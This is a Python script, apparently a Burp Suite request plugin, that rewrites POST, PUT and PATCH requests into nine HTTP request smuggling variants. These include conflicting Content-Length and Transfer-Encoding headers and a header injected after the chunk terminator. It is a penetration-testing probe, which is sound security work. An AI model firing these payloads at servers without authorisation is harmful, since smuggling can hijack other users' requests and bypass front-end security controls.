#!/usr/bin/env python3
"""
HTTP Request Smuggling Probe (Bambda)

Prepares a single smuggling variant per invocation by adjusting headers/body.
Variants include CL.TE, TE.CL, TE.TE, CL.CL, duplicate TE, invalid TE, and header injection after chunk terminator.

Usage:
- Load as a request script in Burp (Repeater/Proxy/Scanner context)
- Optionally set header `X-HRS-Variant: <name>` to choose a specific variant
  Supported names: cl.te, te.cl, te.te, cl.cl, te.dup, te.invalid, cl.neg, cl.zero, te.inject

Notes:
- Applicability: only for API-like paths and methods that support bodies (POST/PUT/PATCH)
- This script does not assert vulnerability on its own; use response anomalies/timeouts to guide manual testing.
"""
import os
import sys

CURRENT_DIR = os.path.dirname(__file__)
SRC_PATH = os.path.abspath(os.path.join(CURRENT_DIR, "..", "..", "src"))
if SRC_PATH not in sys.path:
    sys.path.append(SRC_PATH)

try:
    from utils.intelligence_checker import ApplicabilityChecker
    checker = ApplicabilityChecker()
except Exception:
    checker = None

VARIANTS = {
    # Content-Length + Transfer-Encoding
    "cl.te": {
        "headers": {"Content-Length": "6", "Transfer-Encoding": "chunked"},
        "body": "0\r\n\r\nX",
    },
    # Transfer-Encoding + Content-Length
    "te.cl": {
        "headers": {"Transfer-Encoding": "chunked", "Content-Length": "4"},
        "body": "0\r\n\r\nX",
    },
    # Two TE headers with different values
    "te.te": {
        "headers": {"Transfer-Encoding": "chunked, identity"},
        "body": "0\r\n\r\nX",
    },
    # Two CL headers with different values
    "cl.cl": {
        "headers": {"Content-Length": "6, 4"},
        "body": "0\r\n\r\nX",
    },
    # Duplicate TE headers
    "te.dup": {
        "headers": {"Transfer-Encoding": "chunked, chunked"},
        "body": "0\r\n\r\nX",
    },
    # Invalid TE value
    "te.invalid": {
        "headers": {"Transfer-Encoding": "invalid"},
        "body": "X",
    },
    # Negative Content-Length
    "cl.neg": {
        "headers": {"Content-Length": "-1"},
        "body": "X",
    },
    # Zero Content-Length with extra data
    "cl.zero": {
        "headers": {"Content-Length": "0"},
        "body": "X",
    },
    # Header injection after chunk terminator
    "te.inject": {
        "headers": {"Transfer-Encoding": "chunked"},
        "body": "0\r\n\r\nX-Injected: 1",
    },
}

DEFAULT_ORDER = [
    "cl.te", "te.cl", "te.te", "cl.cl", "te.dup", "te.invalid", "cl.neg", "cl.zero", "te.inject"
]


def _choose_variant(headers: dict) -> str:
    # Allow selection via header
    sel = headers.get("X-HRS-Variant") or headers.get("x-hrs-variant")
    if sel and sel.strip().lower() in VARIANTS:
        return sel.strip().lower()
    # Fallback deterministic order
    return DEFAULT_ORDER[0]


def main(request):
    # Applicability
    if checker:
        method = getattr(request, "method", "GET").upper()
        if method not in ("POST", "PUT", "PATCH"):
            return request
        if not checker.is_request_smuggling_applicable(request):
            return request

    headers = dict(getattr(request, "headers", {}) or {})
    variant_name = _choose_variant(headers)
    variant = VARIANTS[variant_name]

    # Apply variant headers
    for k, v in variant["headers"].items():
        headers[k] = v
    # Encourage keep-alive
    if "Connection" not in headers and "connection" not in headers:
        headers["Connection"] = "keep-alive"

    request.headers = headers
    request.body = variant["body"]
    return request

if __name__ == "__main__":
    print("HTTP Request Smuggling Probe Bambda ready. Set X-HRS-Variant to choose variant.")